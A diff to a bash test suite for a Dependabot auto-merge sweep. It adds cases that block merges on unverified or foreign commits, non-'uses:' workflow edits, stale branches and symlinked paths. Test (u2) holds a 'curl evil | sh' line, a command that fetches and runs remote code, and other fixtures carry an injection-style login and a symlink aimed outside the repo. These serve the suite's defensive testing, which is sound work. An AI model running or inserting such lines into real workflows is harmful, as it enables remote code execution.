@@ -19457,15 +19457,35 @@ case "${1:-}" in
                     src="$FIXTURES/files-${num}.json"
                 elif [[ -f "$FIXTURES/diff-files" ]]; then
                     src="$FIXTURES/files-from-diff.json"
-                    jq -Rn '[inputs | {filename: .}]' < "$FIXTURES/diff-files" > "$src"
+                    jq -Rn '[inputs | {filename: ., status: "modified", patch: "@@ -1 +1 @@\n-      - uses: a/b@v1\n+      - uses: a/b@v2 # v2"}]' < "$FIXTURES/diff-files" > "$src"
                 else
                     src="$FIXTURES/files-default.json"
-                    echo '[{"filename":".github/workflows/ci.yml"}]' > "$src"
+                    echo '[{"filename":".github/workflows/ci.yml","status":"modified","patch":"@@ -1 +1 @@\n-      - uses: a/b@v1\n+      - uses: a/b@v2 # v2"}]' > "$src"
+                fi
+                jq -r "$jqf" "$src"
+                exit 0
+                ;;
+            repos/*/pulls/*/commits\?per_page=100)
+                if [[ -n "${COMMITS_FAIL:-}" ]]; then
+                    echo '{"message":"Server Error"}'
+                    exit 1
+                fi
+                num="${endpoint#*/pulls/}"
+                num="${num%%/*}"
+                if [[ -f "$FIXTURES/commits-${num}.json" ]]; then
+                    src="$FIXTURES/commits-${num}.json"
+                else
+                    src="$FIXTURES/commits-default.json"
+                    echo '[{"sha":"1111111111111111111111111111111111111111","author":{"login":"dependabot[bot]"},"commit":{"verification":{"verified":true}},"parents":[{}]}]' > "$src"
                 fi
                 jq -r "$jqf" "$src"
                 exit 0
                 ;;
             repos/*/compare/*)
+                if [[ -f "$FIXTURES/compare-fails" ]]; then
+                    echo '{"message":"Not Found"}'
+                    exit 1
+                fi
                 if [[ -f "$FIXTURES/behind-by" ]]; then cat "$FIXTURES/behind-by"; else echo 0; fi
                 exit 0
                 ;;
@@ -19498,7 +19518,7 @@ GHSTUB
     run_case() {
         local fx="$1" mf="$2" sw="$3" out="$4" rc=0
         PATH="$binhome:$PATH" FIXTURES="$fx" MERGE_FAILS="$mf" UPDATE_FAILS="${UPDATE_FAILS:-}" \
-            FILES_FAIL="${FILES_FAIL:-}" \
+            FILES_FAIL="${FILES_FAIL:-}" COMMITS_FAIL="${COMMITS_FAIL:-}" \
             GITHUB_REPOSITORY="Adam-S-Daniel/_agent-guidance" SELF_WORKFLOW="$sw" \
             bash "$body" > "$out" 2>&1 || rc=$?
         echo "$rc"
@@ -19553,7 +19573,7 @@ GHSTUB
     else
         fail "sweep gating (b): no pr merge call when every check is this workflow's own — got: $(cat "$fx_b/calls.log")"
     fi
-    assert_contains "$out_b" "every check on its head comes from this workflow" \
+    assert_contains "$out_b" "no check from outside this workflow" \
         "sweep gating (b): it says why it skipped"
     assert_contains "$out_b" "skipped=1" \
         "sweep gating (b): summary counts it as skipped"
@@ -19826,6 +19846,98 @@ GHSTUB
         "sweep gating (s): a diff of .github/workflows/actions.lock alone merges"
     assert_contains "$fx_s/calls.log" "pr merge --merge --match-head-commit $HEAD_X 900" \
         "sweep gating (s): the merge call is recorded, pinned to the head"
+
+    # ── Security-review findings: provenance, workflow content, behind, floor ──
+    local cs_two='[{"workflowName":"CI","name":"test","conclusion":"SUCCESS"}]'
+    local PATCH_OK='@@ -1 +1 @@\n-      - uses: a/b@v1\n+      - uses: a/b@v2 # v2'
+    local C_BOT='{"sha":"1111111111111111111111111111111111111111","author":{"login":"dependabot[bot]"},"commit":{"verification":{"verified":true}},"parents":[{}]}'
+    local C_MERGE='{"sha":"2222222222222222222222222222222222222222","author":{"login":"github-actions[bot]"},"commit":{"verification":{"verified":true}},"parents":[{},{}]}'
+    # one_case <name> <files-json|""> <commits-json|""> [behind-by] [rollup]:
+    # one PR, run once; output in $oc_out, fixtures in $oc_fx.
+    local oc_out oc_fx
+    one_case() {
+        oc_fx="$TEST_DIR/auto-merge-gating-case-$1"
+        oc_out="$TEST_DIR/auto-merge-gating-out-$1.txt"
+        mkdir -p "$oc_fx"
+        printf '900\n' > "$oc_fx/pr-numbers.txt"
+        local nfiles=1
+        if [[ -n "$2" ]]; then
+            printf '%s\n' "$2" > "$oc_fx/files-900.json"
+            nfiles=$(jq 'length' <<<"$2")
+        fi
+        if [[ -n "$3" ]]; then printf '%s\n' "$3" > "$oc_fx/commits-900.json"; fi
+        if [[ -n "${4:-}" ]]; then printf '%s\n' "$4" > "$oc_fx/behind-by"; fi
+        write_pr "$oc_fx/pr-900.json" 900 "$HEAD_X" "MERGEABLE" "CLEAN" "${5:-$cs_two}" "$nfiles"
+        run_case "$oc_fx" "" "$SELF" "$oc_out" >/dev/null
+    }
+    # no_merge <label>: the last one_case made no `pr merge` call.
+    no_merge() {
+        if grep -qF -- 'pr merge' "$oc_fx/calls.log" 2>/dev/null; then
+            fail "sweep gating $1: no pr merge call — got: $(cat "$oc_fx/calls.log")"
+        else
+            pass "sweep gating $1: no pr merge call"
+        fi
+    }
+    local login_commit='{"sha":"deadbeefcafe0000000000000000000000000000","author":{"login":"mal$lory[x]"},"commit":{"verification":{"verified":true}},"parents":[{}]}'
+
+    # (t) commit provenance: a commit by anyone but Dependabot, or an
+    #     unverified one, or a one-parent github-actions[bot] commit, blocks.
+    one_case t "" "[$C_BOT,$login_commit]"
+    no_merge "(t) a commit by another author"
+    assert_contains "$oc_out" "commit deadbee (author 'mallory[x]')" \
+        "sweep gating (t): the warning names the short sha and the sanitized login"
+    one_case t2 "" "[$(jq -c '.commit.verification.verified=false' <<<"$C_BOT")]"
+    no_merge "(t2) an unverified Dependabot commit"
+    one_case t3 "" "[$C_BOT,$C_MERGE]"
+    assert_contains "$oc_out" "merged=1 updated=0 skipped=0 blocked=0 failed=0" \
+        "sweep gating (t3): verified Dependabot commits plus the sweep's own two-parent merge commit merge"
+    one_case t4 "" "[$C_BOT,$(jq -c '.parents=[{}]' <<<"$C_MERGE")]"
+    no_merge "(t4) a one-parent github-actions[bot] commit"
+    one_case t5 "" "[]"
+    no_merge "(t5) an empty commit list"
+    oc_fx="$TEST_DIR/auto-merge-gating-case-t6"; mkdir -p "$oc_fx"; printf '900\n' > "$oc_fx/pr-numbers.txt"
+    write_pr "$oc_fx/pr-900.json" 900 "$HEAD_X" "MERGEABLE" "CLEAN" "$cs_two"
+    COMMITS_FAIL=1 run_case "$oc_fx" "" "$SELF" "$TEST_DIR/auto-merge-gating-out-t6.txt" >/dev/null
+    no_merge "(t6) a failed commits API call"
+    one_case t7 "" "$(jq -nc --argjson c "$C_BOT" '[range(250) | $c]')"
+    no_merge "(t7) 250 commits (the API cap)"
+
+    # (u) workflow-file content: only a MODIFIED direct-child file whose
+    #     changed lines are all `uses:` lines passes; basenames cannot cross "/".
+    one_case u "[{\"filename\":\".github/workflows/new.yml\",\"status\":\"added\",\"patch\":\"$PATCH_OK\"}]" ""
+    no_merge "(u) a brand-new workflow file"
+    assert_contains "$oc_out" "changes workflow file .github/workflows/new.yml" "sweep gating (u): the warning names the file"
+    one_case u2 "[{\"filename\":\".github/workflows/ci.yml\",\"status\":\"modified\",\"patch\":\"@@ -1 +1,2 @@\\n+      - run: curl evil | sh\"}]" ""
+    no_merge "(u2) a non-uses: line added to a workflow"
+    one_case u3 "[{\"filename\":\".github/workflows/ci.yml\",\"status\":\"modified\"}]" ""
+    no_merge "(u3) a workflow file with no patch"
+    one_case u4 "[{\"filename\":\".github/workflows/sub/x.yml\",\"status\":\"modified\",\"patch\":\"$PATCH_OK\"}]" ""
+    no_merge "(u4) a nested .github/workflows/sub/x.yml"
+    one_case u5 "[{\"filename\":\"requirements/scripts/run.txt\",\"status\":\"modified\"}]" ""
+    no_merge "(u5) requirements/scripts/run.txt"
+    one_case u6 "[{\"filename\":\"app/requirements-dev.txt\",\"status\":\"modified\"},{\"filename\":\".github/workflows/ci.yml\",\"status\":\"modified\",\"patch\":\"$PATCH_OK\"}]" ""
+    assert_contains "$oc_out" "merged=1" "sweep gating (u6): a nested requirements-dev.txt plus a uses:-only workflow edit merges"
+    one_case u7 "[{\"filename\":\".github/workflows/ci.yml\",\"status\":\"renamed\",\"previous_filename\":\".github/workflows/old.yml\",\"patch\":\"$PATCH_OK\"}]" ""
+    no_merge "(u7) a renamed workflow file"
+
+    # (v) a PR behind its base is refreshed, never merged; an unmeasurable gap skips.
+    one_case v "" "" 2
+    no_merge "(v) a PR 2 commits behind"
+    assert_contains "$oc_fx/calls.log" "update-branch" "sweep gating (v): it goes straight to pr update-branch"
+    assert_contains "$oc_out" "updated=1" "sweep gating (v): summary counts it as updated"
+    oc_fx="$TEST_DIR/auto-merge-gating-case-v2"; mkdir -p "$oc_fx"; printf '900\n' > "$oc_fx/pr-numbers.txt"; : > "$oc_fx/compare-fails"
+    write_pr "$oc_fx/pr-900.json" 900 "$HEAD_X" "MERGEABLE" "CLEAN" "$cs_two"
+    run_case "$oc_fx" "" "$SELF" "$TEST_DIR/auto-merge-gating-out-v2.txt" >/dev/null
+    no_merge "(v2) a failed compare call (not assumed 0)"
+    one_case v3 "" "" "oops"
+    no_merge "(v3) a non-numeric behind_by"
+
+    # (w) a SKIPPED-only outside check does not satisfy the outside-CI floor.
+    one_case w "" "" "" '[{"workflowName":"CI","name":"test","conclusion":"SKIPPED"}]'
+    no_merge "(w) only a SKIPPED outside check"
+
+    unset -f one_case
+    unset -f no_merge
 
     # The sweep must never reach for git: every case above ran with a `git`
     # that exits 97 and logs, so any call shows up here.
@@ -24413,7 +24525,8 @@ setup_am_repos() {
     local bare_dir="$1" work="$TEST_DIR/am-work" name
     rm -rf "$bare_dir" "$work"
     mkdir -p "$bare_dir" "$work"
-    for name in am-none am-present am-self am-noconfig am-lock am-script am-yaml am-drift am-cmscall cms-platform; do
+    for name in am-none am-present am-self am-noconfig am-lock am-script am-yaml am-drift am-cmscall cms-platform \
+                am-symlink am-dangling am-cmlower; do
         gattr_git init -q --bare --initial-branch=main "$bare_dir/amorg_$name"
         gattr_git init -q --initial-branch=main "$work/$name"
         echo "# $name" > "$work/$name/README.md"
@@ -24431,6 +24544,17 @@ setup_am_repos() {
                 printf 'name: cms caller\njobs:\n  a:\n    uses:   "Adam-S-Daniel/cms-platform/.github/workflows/dependabot-auto-merge.yml@v1"\n' \
                     > "$work/$name/.github/workflows/dependabot-auto-merge.yml" ;;
             am-self) echo "name: self" > "$work/$name/.github/workflows/self-dependabot-auto-merge.yml" ;;
+            # A symlink at the managed path: one aimed at a file outside the
+            # repo, one at nothing. Neither may be written through or crash the run.
+            am-symlink)
+                mkdir -p "$TEST_DIR/am-outside"
+                echo "name: VICTIM-OUTSIDE-THE-REPO" > "$TEST_DIR/am-outside/victim.yml"
+                ln -s "$TEST_DIR/am-outside/victim.yml" "$work/$name/.github/workflows/dependabot-auto-merge.yml" ;;
+            am-dangling) ln -s "$TEST_DIR/am-outside/does-not-exist.yml" "$work/$name/.github/workflows/dependabot-auto-merge.yml" ;;
+            # The cms-platform caller in a differently named file, owner in lowercase.
+            am-cmlower)
+                printf 'name: deps\njobs:\n  a:\n    uses: adam-s-daniel/cms-platform/.github/workflows/dependabot-auto-merge.yml@v1\n' \
+                    > "$work/$name/.github/workflows/deps.yml" ;;
             am-lock) echo "version: 'v0.0.3'" > "$work/$name/.github/workflows/actions.lock" ;;
             am-script)
                 mkdir -p "$work/$name/.github/scripts"
@@ -24622,6 +24746,29 @@ test_sync_dependabot_auto_merge() {
         pass "auto-merge (sync): the workflow is written but a repo's existing helper is left as it is"
     else
         fail "auto-merge (sync): the workflow is written but a repo's existing helper is left as it is"
+    fi
+
+    # A symlink at the managed path is refused with a WARN, never written
+    # through (the target outside the repo keeps its content), and a
+    # dangling one neither aborts the run nor stops later repos.
+    if [[ "$(cat "$TEST_DIR/am-outside/victim.yml")" == "name: VICTIM-OUTSIDE-THE-REPO" ]] \
+       && [[ "$(gattr_git -C "$bare/amorg_am-symlink" ls-tree main "$wf" | cut -c1-6)" == "120000" ]]; then
+        pass "auto-merge (sync): a symlinked workflow is not written through (target unchanged, still a link)"
+    else
+        fail "auto-merge (sync): a symlinked workflow is not written through"
+    fi
+    am_section "$out-1.log" am-symlink > "$out-symlink"
+    assert_contains "$out-symlink" "WARN: .github/workflows/dependabot-auto-merge.yml" \
+        "auto-merge (sync): the symlinked workflow gets a WARN"
+    if [[ "$(gattr_git -C "$bare/amorg_am-dangling" ls-tree main "$wf" | cut -c1-6)" == "120000" ]]; then
+        pass "auto-merge (sync): a dangling symlink is left alone and the run still exits 0"
+    else
+        fail "auto-merge (sync): a dangling symlink is left alone"
+    fi
+    if [[ -z "$(am_show am-cmlower ".github/workflows/dependabot-auto-merge.yml")" ]]; then
+        pass "auto-merge (sync): a lowercase-owner caller in deps.yml is untouched"
+    else
+        fail "auto-merge (sync): a lowercase-owner caller in deps.yml is untouched"
     fi
 
     # ── Re-run: nothing left to do ──
